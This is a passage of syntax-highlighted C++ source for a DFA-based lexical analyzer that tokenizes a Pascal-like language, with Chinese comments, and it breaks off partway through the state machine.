<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> idMax 20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> keyWordsLen 14</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">wordsAnalyzer</span>&#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="type">char</span> wd;            <span class="comment">// 读取字符</span></span><br><span class="line">        <span class="type">int</span> len, status;    <span class="comment">// 缓存长度与自动机状态</span></span><br><span class="line">        <span class="type">int</span> flag;           <span class="comment">// 标记分析器是否正常</span></span><br><span class="line">        <span class="type">int</span> wordsLen;       <span class="comment">// 词元数量</span></span><br><span class="line">        <span class="type">int</span> type;           <span class="comment">// 种别归类: 0-关键字 1-运算符 2-常数 3-界符 4-标识符 5-注释串</span></span><br><span class="line">        <span class="type">int</span> cag;         <span class="comment">// 种别码, 保持为可查表位序+1</span></span><br><span class="line">        <span class="type">int</span> srcLen;     <span class="comment">// 源码长度</span></span><br><span class="line">        <span class="type">int</span> needOF;     <span class="comment">// 是否需要保存至文件</span></span><br><span class="line">        vector&lt;string&gt; strV;    <span class="comment">// 存储词元</span></span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; typeV;    <span class="comment">// 存储种别码</span></span><br><span class="line">        string words;       <span class="comment">// 缓存</span></span><br><span class="line">        string src;     <span class="comment">// 源码字符串</span></span><br><span class="line">        FILE *oF;    <span class="comment">// 结果保存文件，默认为fiP</span></span><br><span class="line">        string oFP;     <span class="comment">// 保存路径</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="comment">// 词元编码表</span></span><br><span class="line">        vector&lt;string&gt; wordsTable = &#123;</span><br><span class="line">            <span class="string">&quot;program&quot;</span>, <span class="string">&quot;var&quot;</span>, <span class="string">&quot;integer&quot;</span>, <span class="string">&quot;real&quot;</span>,            <span class="comment">// 0-3</span></span><br><span class="line">            <span class="string">&quot;begin&quot;</span>, <span class="string">&quot;end&quot;</span>, <span class="string">&quot;if&quot;</span>, <span class="string">&quot;then&quot;</span>,                   <span class="comment">// 4-7</span></span><br><span class="line">            <span class="string">&quot;else&quot;</span>, <span class="string">&quot;while&quot;</span>, <span class="string">&quot;do&quot;</span>, <span class="string">&quot;repeat&quot;</span>,                <span class="comment">// 8-11</span></span><br><span class="line">            <span class="string">&quot;until&quot;</span>, <span class="string">&quot;for&quot;</span>, <span class="string">&quot;NaN&quot;</span>, <span class="string">&quot;NaN&quot;</span>,                   <span class="comment">// 12-15（跳过14, 15）</span></span><br><span class="line">            <span class="string">&quot;NaN&quot;</span>, <span class="string">&quot;NaN&quot;</span>, <span class="string">&quot;NaN&quot;</span>, <span class="string">&quot;NaN&quot;</span>,                     <span class="comment">// 16-19（全跳过）</span></span><br><span class="line">            <span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;/&quot;</span>,                             <span class="comment">// 20-23</span></span><br><span class="line">            <span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;&gt;=&quot;</span>, <span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;&lt;=&quot;</span>,                           <span class="comment">// 24-27</span></span><br><span class="line">            <span class="string">&quot;=&quot;</span>, <span class="string">&quot;&lt;&gt;&quot;</span>, <span class="string">&quot;:=&quot;</span>, <span class="string">&quot;&amp;&amp;&quot;</span>,                          <span class="comment">// 28-31</span></span><br><span class="line">            <span class="string">&quot;||&quot;</span>, <span class="string">&quot;!&quot;</span>, <span class="string">&quot;NaN&quot;</span>, <span class="string">&quot;NaN&quot;</span>,                        <span class="comment">// 32-35（跳过34, 35）</span></span><br><span class="line">            <span class="string">&quot;NaN&quot;</span>, <span class="string">&quot;NaN&quot;</span>, <span class="string">&quot;NaN&quot;</span>, <span class="string">&quot;NaN&quot;</span>,                     <span class="comment">// 36-39（全跳过）</span></span><br><span class="line">            <span class="string">&quot;integerConst&quot;</span>, <span class="string">&quot;doubleConst&quot;</span>, <span class="string">&quot;NaN&quot;</span>, <span class="string">&quot;NaN&quot;</span>,    <span class="comment">// 40-43（跳过42, 43）</span></span><br><span class="line">            <span class="string">&quot;id&quot;</span>, <span class="string">&quot;NaN&quot;</span>, <span class="string">&quot;NaN&quot;</span>, <span class="string">&quot;NaN&quot;</span>,                      <span class="comment">// 44-47（跳过45, 47）</span></span><br><span class="line">            <span class="string">&quot;NaN&quot;</span>, <span class="string">&quot;NaN&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;.&quot;</span>,                         <span class="comment">// 48-51（跳过48, 49）</span></span><br><span class="line">            <span class="string">&quot;,&quot;</span>, <span class="string">&quot;:&quot;</span>, <span class="string">&quot;(&quot;</span>, <span class="string">&quot;)&quot;</span>,                             <span class="comment">// 52-55</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 空白字符</span></span><br><span class="line">        <span class="type">const</span> vector&lt;<span class="type">char</span>&gt; filt = &#123;<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\0&#x27;</span>&#125;;</span><br><span class="line">        <span class="comment">// 单字分隔符,不考虑冒号,点号</span></span><br><span class="line">        <span class="type">const</span> vector&lt;<span class="type">char</span>&gt; delm = &#123;<span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">wordsAnalyzer</span>(string fiP = <span class="string">&quot;./test.txt&quot;</span>, string foP = <span class="string">&quot;./res.txt&quot;</span>)&#123;</span><br><span class="line">            flag = <span class="number">1</span>;               <span class="comment">// 分析器状态ok</span></span><br><span class="line">            words = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            len = <span class="number">0</span>;</span><br><span class="line">            status = <span class="number">0</span>;     <span class="comment">// 自动机起点</span></span><br><span class="line">            wordsLen = <span class="number">0</span>;   <span class="comment">// 词元数量</span></span><br><span class="line">            oFP = foP;      <span class="comment">// 保存路径</span></span><br><span class="line">            ifstream ins;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(oFP!=<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">                needOF = <span class="number">1</span>;</span><br><span class="line">                oF = <span class="built_in">fopen</span>(oFP.<span class="built_in">c_str</span>(), <span class="string">&quot;w&quot;</span>);    <span class="comment">// 覆盖式的写入</span></span><br><span class="line">                <span class="keyword">if</span>(oF==<span class="literal">NULL</span>)&#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;Fail to write in the file: %s&quot;</span>, oFP.<span class="built_in">c_str</span>());</span><br><span class="line">                    <span class="keyword">this</span>-&gt;flag = <span class="number">0</span>;</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">newPrintf</span>(<span class="string">&quot;Output file path: %s -&gt; Succeed!\n&quot;</span>, oFP.<span class="built_in">c_str</span>());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> needOF = <span class="number">0</span>;    <span class="comment">// 不保存文件</span></span><br><span class="line">            ins.<span class="built_in">open</span>(fiP, ios::in);     <span class="comment">// 读入模式打开文件</span></span><br><span class="line">            <span class="keyword">if</span>(!ins.<span class="built_in">good</span>())&#123;    <span class="comment">// 检测文件是否正常打开</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Fail to open the file: %s&quot;</span>, fiP.<span class="built_in">c_str</span>());</span><br><span class="line">                <span class="keyword">this</span>-&gt;flag = <span class="number">0</span>;</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">-1</span>);       <span class="comment">// 出错, 终止程序</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">newPrintf</span>(<span class="string">&quot;Input file path: %s -&gt; Succeed!\n&quot;</span>, fiP.<span class="built_in">c_str</span>());   <span class="comment">// 展示读取路径</span></span><br><span class="line">            <span class="built_in">printSplit</span>(<span class="string">&quot;Src&quot;</span>);  <span class="comment">// 分割线</span></span><br><span class="line">            </span><br><span class="line">            <span class="type">char</span> _ch;</span><br><span class="line">            src = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">while</span>((_ch = ins.<span class="built_in">get</span>()) != EOF)&#123;    <span class="comment">// 存入源码串中</span></span><br><span class="line">                src += _ch;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            ins.<span class="built_in">close</span>();</span><br><span class="line">            src += <span class="string">&#x27;\0&#x27;</span>;    <span class="comment">// 添加终止符</span></span><br><span class="line">            srcLen = src.<span class="built_in">length</span>();  <span class="comment">// 源码串长度</span></span><br><span class="line">            <span class="built_in">newPrintf</span>(<span class="string">&quot;%s\n&quot;</span>, src.<span class="built_in">c_str</span>());    <span class="comment">// 展示源码</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ~<span class="built_in">wordsAnalyzer</span>()&#123;</span><br><span class="line">            <span class="built_in">fclose</span>(oF);     <span class="comment">// 关闭FILE文件流</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">analyze</span><span class="params">()</span></span>&#123;    <span class="comment">// 词法分析器</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;srcLen; i++)&#123;</span><br><span class="line">                wd = src[i];</span><br><span class="line">                <span class="keyword">switch</span>(status)&#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">0</span>:    <span class="comment">// 自动机起点，words为空</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">isBlank</span>()) <span class="built_in">blankContinue</span>();   <span class="comment">// 跳过空白字符</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isLowerLetter</span>() || <span class="built_in">isUpperLetter</span>()) <span class="built_in">newStatus</span>(<span class="number">1</span>);   <span class="comment">// 转移状态-&gt;1 字母开头 大写字母可以用于区分标识符和关键字，但即使全是小写字母也需要单独检查，因此全是字母归为一类</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isNumber</span>(<span class="number">0</span>)) <span class="built_in">newStatus</span>(<span class="number">2</span>);                          <span class="comment">// 转移状态-&gt;2 非零数字开头</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;0&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">3</span>);                            <span class="comment">// 转移状态-&gt;3  0开头</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;&amp;&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">4</span>);         <span class="comment">// 转移状态-&gt;4  多字运算符</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;|&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">5</span>);         <span class="comment">// 转移状态-&gt;5  </span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;:&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">6</span>);         <span class="comment">// 转移状态-&gt;6</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;&gt;&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">7</span>);         <span class="comment">// 转移状态-&gt;7</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;&lt;&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">8</span>);         <span class="comment">// 转移状态-&gt;8</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;/&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">9</span>);         <span class="comment">// 转移状态-&gt;9</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;*&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">10</span>);        <span class="comment">// 状态转移-&gt;10 单字运算符</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;=&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">11</span>);        <span class="comment">// 状态转移-&gt;11 </span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;!&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">12</span>);        <span class="comment">// 状态转移-&gt;12 </span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;+&#x27;</span> || wd == <span class="string">&#x27;-&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">13</span>);         <span class="comment">// 状态转移-&gt;13 加减号(正负号)</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;.&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">14</span>);        <span class="comment">// 状态转移-&gt;14 考虑.5 == 0.5 ,此时.后必须有数字</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isDelimiter</span>())&#123;        <span class="comment">// 单字分界符直接给出结果</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">-1</span>);</span><br><span class="line">                            type = <span class="number">3</span>;</span><br><span class="line">                            <span class="built_in">output</span>();               <span class="comment">// 存储词元、输出、初始化</span></span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> i = <span class="built_in">passError</span>(i);      <span class="comment">// 检测到非法字符如&quot;^#$&quot;等</span></span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">1</span>:&#123;    <span class="comment">// 字母开头,全字母情况 可终止 -&gt; 标识符或关键字</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">isLowerLetter</span>() || <span class="built_in">isUpperLetter</span>()) <span class="built_in">newStatus</span>(<span class="number">1</span>);    <span class="comment">// 原地踏步</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isNumber</span>() || wd == <span class="string">&#x27;_&#x27;</span>)&#123;     <span class="comment">// 状态转移-&gt;17</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">17</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span>&#123;       <span class="comment">// 处理缓存内容</span></span><br><span class="line">                            cag = <span class="built_in">isKeywords</span>();</span><br><span class="line">                            <span class="keyword">if</span>(cag) type = <span class="number">0</span>;   <span class="comment">// 是关键字</span></span><br><span class="line">                            <span class="keyword">else</span> type = <span class="number">4</span>;    <span class="comment">// 标识符</span></span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                            i -= <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">2</span>:&#123;        <span class="comment">// 非零数字开头，可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(wd==<span class="string">&#x27;.&#x27;</span>)&#123;    <span class="comment">// 转移状态-&gt;18 十进制实数, 此时.后可以无内容</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">18</span>);   </span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;e&#x27;</span> || wd == <span class="string">&#x27;E&#x27;</span>)&#123;    <span class="comment">// 转移状态-&gt;19 科学计数法E</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">19</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isNumber</span>())&#123;      <span class="comment">// 原地踏步</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">2</span>);   </span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isLowerLetter</span>() || <span class="built_in">isUpperLetter</span>() || wd == <span class="string">&#x27;\&#x27;&#x27;</span> || wd == <span class="string">&#x27;&quot;&#x27;</span>)&#123;     <span class="comment">// 十进制数后跟字母或引号铁铁出错</span></span><br><span class="line">                            i = <span class="built_in">passError</span>(i);   <span class="comment">// 出错处理</span></span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span>&#123;       <span class="comment">// 被视为整常数，重置缓存</span></span><br><span class="line">                            type = <span class="number">2</span>;</span><br><span class="line">                            cag = <span class="number">41</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                            i -= <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">3</span>:&#123;    <span class="comment">// 0开头数字，可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(wd == <span class="string">&#x27;X&#x27;</span> || wd == <span class="string">&#x27;x&#x27;</span>)&#123;     <span class="comment">// 状态转移-&gt;20 十六进制X</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">20</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;b&#x27;</span> || wd == <span class="string">&#x27;B&#x27;</span>)&#123;    <span class="comment">// 状态转移-&gt;21 二进制数b</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">21</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isNumber</span>(<span class="number">8</span>))&#123;   <span class="comment">// 状态转移-&gt;22 八进制数</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">22</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isLowerLetter</span>() || <span class="built_in">isUpperLetter</span>() || wd == <span class="string">&#x27;\&#x27;&#x27;</span> || wd == <span class="string">&#x27;&quot;&#x27;</span>)&#123;     <span class="comment">// 十进制数后跟字母或引号铁铁出错</span></span><br><span class="line">                            i = <span class="built_in">passError</span>(i);   <span class="comment">// 出错处理</span></span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span>&#123;       <span class="comment">// 被视为整常数0</span></span><br><span class="line">                            type = <span class="number">2</span>;</span><br><span class="line">                            cag = <span class="number">41</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                            i -= <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">4</span>:&#123;    <span class="comment">// 检查 &amp; 不可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(wd == <span class="string">&#x27;&amp;&#x27;</span>)&#123;  <span class="comment">// 与运算符</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">-1</span>);</span><br><span class="line">                            type = <span class="number">1</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            i = <span class="built_in">passError</span>(i);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">5</span>:&#123;    <span class="comment">// 检查 | 不可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(wd == <span class="string">&#x27;|&#x27;</span>)&#123;  <span class="comment">// 或运算符</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">-1</span>);</span><br><span class="line">                            type = <span class="number">1</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            i = <span class="built_in">passError</span>(i);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">6</span>:&#123;    <span class="comment">// 检查 : 可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(wd == <span class="string">&#x27;=&#x27;</span>)&#123;  <span class="comment">// 赋值号:=</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">-1</span>);</span><br><span class="line">                            type = <span class="number">1</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                        &#125; <span class="keyword">else</span>&#123;    <span class="comment">// 冒号:</span></span><br><span class="line">                            type = <span class="number">3</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                            i -= <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">7</span>:&#123;    <span class="comment">// 检查 &gt; 可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(wd == <span class="string">&#x27;=&#x27;</span>)&#123;  <span class="comment">// &gt;=</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">-1</span>);</span><br><span class="line">                            type = <span class="number">1</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;    <span class="comment">// &gt;</span></span><br><span class="line">                            type = <span class="number">1</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                            i -= <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">8</span>:&#123;    <span class="comment">// 检查 &lt; 可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(wd == <span class="string">&#x27;=&#x27;</span>)&#123;  <span class="comment">// &lt;=</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">-1</span>);</span><br><span class="line">                            type = <span class="number">1</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;&gt;&#x27;</span>)&#123;   <span class="comment">// &lt;&gt;</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">-1</span>);</span><br><span class="line">                            type = <span class="number">1</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> &#123;    <span class="comment">// &lt;</span></span><br><span class="line">                            type = <span class="number">1</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                            i -= <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">9</span>:&#123;    <span class="comment">// 检查 / 可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(wd == <span class="string">&#x27;/&#x27;</span>)&#123;  <span class="comment">// 状态转移-&gt;23 单行注释符//</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">23</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;*&#x27;</span>)&#123; <span class="comment">// 状态转移-&gt;24 多行注释符</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">24</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;    <span class="comment">// 除号/</span></span><br><span class="line">                            type = <span class="number">1</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                            i -= <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">10</span>:&#123;   <span class="comment">// 检查 *</span></span><br><span class="line">                        type = <span class="number">1</span>;</span><br><span class="line">                        <span class="built_in">output</span>();</span><br><span class="line">                        i -= <span class="number">1</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">11</span>:&#123;   <span class="comment">// 检查 =</span></span><br><span class="line">                        type = <span class="number">1</span>;</span><br><span class="line">                        <span class="built_in">output</span>();</span><br><span class="line">                        i -= <span class="number">1</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">12</span>:&#123;   <span class="comment">// 检查 !</span></span><br><span class="line">                        type = <span class="number">1</span>;</span><br><span class="line">                        <span class="built_in">output</span>();</span><br><span class="line">                        i -= <span class="number">1</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">13</span>:&#123;   <span class="comment">// +-号 不完美的DFA 可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(cag == <span class="number">41</span> || cag == <span class="number">42</span> || cag == <span class="number">45</span> || cag ==<span class="number">56</span> )&#123;     <span class="comment">// 前面出现操作数则为加减号, &#x27;(&#x27;被视为有效界符, &#x27;)&#x27; 则被视为操作数</span></span><br><span class="line">                            type = <span class="number">1</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                            i -= <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;.&#x27;</span>)&#123;         <span class="comment">// 状态转移-&gt;14 实数</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">14</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isNumber</span>(<span class="number">0</span>))&#123;        <span class="comment">// 状态转移-&gt;2 非0数字</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">2</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;0&#x27;</span>)&#123;         <span class="comment">// 状态转移-&gt;3 数字0</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">3</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span>&#123;   <span class="comment">// 加减号</span></span><br><span class="line">                            type = <span class="number">1</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                            i -= <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">14</span>:&#123;   <span class="comment">// . 实数 可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">isNumber</span>())&#123; <span class="comment">// 状态转移-&gt;18 正常实数</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">18</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            type = <span class="number">3</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                            i -= <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">17</span>:&#123;   <span class="comment">// 标识符 可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">isNumber</span>() || <span class="built_in">isLowerLetter</span>() || <span class="built_in">isUpperLetter</span>() || wd == <span class="string">&#x27;_&#x27;</span>)&#123;  <span class="comment">// 原地踏步</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">17</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;    <span class="comment">// 获取标识符</span></span><br><span class="line">                            type = <span class="number">4</span>;</span><br><span class="line">                            <span class="built_in">output</span>();</span><br><span class="line">                            i -= <span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">18</span>:&#123;   <span class="comment">// 真 实数 后可不跟数字 可终止</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">isNumber</span>())&#123; <span class="comment">// 原地踏步</span></span><br><span class="line">                            <span class="built_in">newStatus</span>(<span class="number">18</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;e&#x27;</span> || wd == <span class="string">&#x27;E&#x27;</span>)&#123; 